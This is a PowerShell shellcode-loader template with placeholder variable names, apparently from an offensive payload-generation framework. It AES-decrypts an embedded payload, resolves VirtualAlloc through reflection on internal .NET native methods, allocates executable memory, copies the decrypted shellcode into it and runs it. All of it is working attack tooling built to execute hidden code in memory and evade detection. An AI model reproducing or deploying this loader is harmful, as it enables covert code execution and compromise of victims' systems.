
$%%VAR14%% = "%%CIPHER%%"

function %%VAR15%%($%%VAR16%%, $%%VAR18%%) {
    $%%VAR17%% = New-Object "System.Security.Cryptography.AesManaged"
    $%%VAR17%%.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $%%VAR17%%.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $%%VAR17%%.BlockSize = 128
    $%%VAR17%%.KeySize = 256
    if ($%%VAR18%%) {
        if ($%%VAR18%%.getType().Name -eq "String") {
            $%%VAR17%%.IV = [System.Convert]::FromBase64String($%%VAR18%%)
        }
        else {
            $%%VAR17%%.IV = $%%VAR18%%
        }
    }
    if ($%%VAR16%%) {
        if ($%%VAR16%%.getType().Name -eq "String") {
            $%%VAR17%%.Key = [System.Convert]::FromBase64String($%%VAR16%%)
        }
        else {
            $%%VAR17%%.Key = $%%VAR16%%
        }
    }
    $%%VAR17%%
}
function %%VAR19%%() {
    $%%VAR20%% = %%VAR15%%
    $%%VAR21%% = New-Object System.Security.Cryptography.SHA256Managed
    $%%VAR22%% = [System.Text.Encoding]::UTF8.GetBytes($%%VAR14%%)
    $%%VAR23%% = $%%VAR21%%.ComputeHash($%%VAR22%%)
    $%%VAR24%% = [System.Convert]::ToBase64String($%%VAR23%%)
    return $%%VAR24%%
}
function %%VAR25%%($%%VAR26%%, $%%VAR27%%) {
    $%%VAR28%% = [System.Convert]::FromBase64String($%%VAR27%%)
    $%%VAR30%% = $%%VAR28%%[0..15]
    $%%VAR29%% = %%VAR15%% $%%VAR26%% $%%VAR30%%
    $%%VAR31%% = $%%VAR29%%.CreateDecryptor();
    $%%VAR32%% = $%%VAR31%%.TransformFinalBlock($%%VAR28%%, 16, $%%VAR28%%.Length - 16);
    [System.Text.Encoding]::UTF8.GetString($%%VAR32%%).Trim([char]0)
}

function %%VAR3%% {
	Param ($%%VAR4%%, $%%VAR5%%)		
	$%%VAR6%% = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$%%VAR7%% = $%%VAR6%%.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $%%VAR7%%.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($%%VAR6%%.GetMethod('GetModuleHandle')).Invoke($null, @($%%VAR4%%)))), $%%VAR5%%))
}

function %%VAR1%% {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $%%VAR2%%,
		[Parameter(Position = 1)] [Type] $%%VAR8%% = [Void]
	)

	$%%VAR9%% = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$%%VAR9%%.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $%%VAR2%%).SetImplementationFlags('Runtime, Managed')
	$%%VAR9%%.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $%%VAR8%%, $%%VAR2%%).SetImplementationFlags('Runtime, Managed')

	return $%%VAR9%%.CreateType()
}

If ([IntPtr]::size -eq 8) {
	$%%VAR10%% = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%%PAYLOAD%%'))
	$%%VAR11%% = %%VAR19%%
	$%%VAR12%% = %%VAR25%% $%%VAR11%% $%%VAR10%%
	[Byte[]]$%%VAR13%% = [System.Convert]::FromBase64String($%%VAR12%%.Replace('"',''))

	$%%VAR33%% = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%%VAR3%% kernel32.dll VirtualAlloc), (%%VAR1%% @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	$%%VAR34%% = $%%VAR33%%.Invoke([IntPtr]::Zero, $%%VAR13%%.Length, 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($%%VAR13%%, 0, $%%VAR34%%, $%%VAR13%%.length)

	$%%VAR35%% = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%%VAR34%%, (%%VAR1%% @([IntPtr]) ([Void])))
	$%%VAR35%%.Invoke([IntPtr]::Zero)
}
